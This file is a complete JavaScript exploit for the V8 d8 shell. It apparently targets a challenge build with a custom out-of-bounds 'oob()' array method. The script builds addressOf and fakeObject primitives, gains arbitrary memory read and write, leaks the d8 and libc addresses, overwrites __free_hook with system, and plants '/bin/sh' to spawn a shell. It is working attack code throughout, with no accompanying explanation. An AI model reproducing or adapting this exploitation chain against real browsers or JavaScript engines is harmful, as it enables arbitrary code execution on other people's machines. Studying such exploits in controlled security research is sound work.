var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

//float -> uint64
function f2u(f)
{
	float64[0] = f;
	return bigUint64[0];
}

//uint64 -> float
function u2f(u)
{
	bigUint64[0] = u;
	return float64[0];
}

function hex(u)
{
	return u.toString(16).padStart(16, "0");
}

var obj = {"a": 1}
var obj_array = [obj]
var float_array = [1.1]

var obj_array_map = obj_array.oob()
var float_array_map = float_array.oob()

//leaking object's address
function addressOf(obj_to_leak)
{
	obj_array[0] = obj_to_leak;
	obj_array.oob(float_array_map);
	let obj_addr = f2u(obj_array[0]) - 1n;
	//restore the obj map
	obj_array.oob(obj_array_map);
	return obj_addr;
}

//turn addr to object
function fakeObject(addr_to_fake)
{
	float_array[0] = u2f(addr_to_fake + 1n);
	float_array.oob(obj_array_map);
	let faked_obj = float_array[0];
	//restore the float map
	float_array.oob(float_array_map);
	return faked_obj;
}

var fake_array = [
	float_array_map,
	u2f(0n),
	u2f(0x41414141n),
	u2f(0x1000000000n),
	1.1,
	2.2,
	];

//%DebugPrint(fake_array)
var fake_array_addr = addressOf(fake_array);

//console.log("fake_array: " + hex(fake_array_addr));
//%SystemBreak();
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);

function read64(addr)
{
	fake_array[2] = u2f(addr - 0x10n + 0x1n);
	let leak_data = f2u(fake_object[0]);
	console.log("[*] leak from: 0x" + hex(addr) + ": 0x" + hex(leak_data));
	return leak_data;
}

var data_buf = new ArrayBuffer(8);
var data_view = new DataView(data_buf);
var buf_backing_stroe_addr = addressOf(data_buf) + 0x20n;

function write64(addr, data)
{
	fake_array[2] = u2f(addr - 0x10n + 1n);
	fake_object[0] = u2f(data);
	//console.log("[*] write to: 0x" + hex(addr) + ": 0x" + hex(data));
}

function write64_dataview(addr, data)
{
	write64(buf_backing_stroe_addr, addr);
	data_view.setFloat64(0, u2f(data), true);
	console.log("[*] write to : 0x" + hex(addr) + ": 0x" + hex(data));
}

var a = [1.1, 2.2, 3.3];
//%DebugPrint(a);
var code_addr = read64(addressOf(a.constructor) + 0x30n);
var leak_d8_addr = read64(code_addr + 0x41n);
console.log("[*] find leak_d8_addr: 0x" + hex(leak_d8_addr));
//%SystemBreak();

var d8_base_addr = leak_d8_addr -0xf8f740n;
console.log("[*] find d8_base_addr: 0x" + hex(d8_base_addr));
var free_got_addr = d8_base_addr + 0x12718A8n
var free_addr = read64(free_got_addr);
console.log("[*] free address: 0x" + hex(free_addr));
var libc_base_addr = free_addr - 0x97950n;
var system_addr = libc_base_addr + 0x4f440n;
console.log("[*] system address: 0x" + hex(system_addr));
var free_hook_addr = libc_base_addr + 0x3ed8e8n;
console.log("[*] free_hook address: 0x" + hex(free_hook_addr))

write64_dataview(free_hook_addr, system_addr);

function get_shell() 
{
	let get_shell_buffer = new ArrayBuffer(0x100);
	let get_shell_dataview = new DataView(get_shell_buffer);
	get_shell_dataview.setFloat64(0, u2f(0x0068732f6e69622fn), true);
	//%DebugPrint(get_shell_dataview);
	//%SystemBreak();
}

get_shell();



